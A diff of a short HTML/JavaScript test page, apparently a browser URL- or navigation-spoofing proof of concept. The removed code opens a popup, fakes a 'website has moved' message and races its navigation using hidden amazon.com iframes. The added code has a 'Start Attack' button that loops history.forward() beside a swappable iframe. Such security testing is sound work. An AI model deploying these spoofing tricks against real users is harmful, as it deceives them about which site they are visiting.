@@ -1,76 +1,34 @@
+<html>
 
-<body>
-<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
-</body>
+<a href="https://www.youtube.com">go to youtube</a>
+<br>
+
+
+<iframe id="1" src="http://www.eurosport.fr"></iframe>
+
+
+<button onclick="document.getElementById('1').src='https://fr.wikipedia.org';">iframe 2</button>
+
+
+<button onclick="attack()">Start Attack</button>
+
 
 <script>
 
-var w;
-var t;
-var z;
 
-if(location.href.indexOf("fake") !== -1){
-document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
-}
+function attack(){
 
+for(var i=0;i<2;i++){
 
-function foo(){
-
-document.getElementById("test").href="#";
-
-w = window.open("?fake");
-
-t = setInterval('bar()',1);
-
-}
-
-function bar(){
-
-if(w.location.href !== 'about:blank'){
-
-alert("Redirecting");
-
-document.body.innerHTML = "<h1>Redirecting</h1>";
-
-slow();
-
-w.location.href = 'https://www.amazon.com/';
-
-clearInterval(t);
-
-z = setInterval('baz()',1);
-
-}
-
-}
-
-function baz(){
-try{
-w.location.href !== 'about:blank';
-}
-catch (e){
-
-//stop page loading
-w.location.href='https://www.google.com/csi';
-clearInterval(z);
-
-//Make sure the old content is not cleared
-setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
-}
+window.history.forward();
 
 }
 
 
-//slow down the website
-function slow() {
-for (i=0; i<10; i++ ) {
-
-iframe = document.createElement("iframe");
-iframe.src = 'https://www.amazon.com/';
-iframe.style = 'display:none';
-document.body.appendChild(iframe);
-
 }
-}
+
 
 </script>
+
+
+</html>
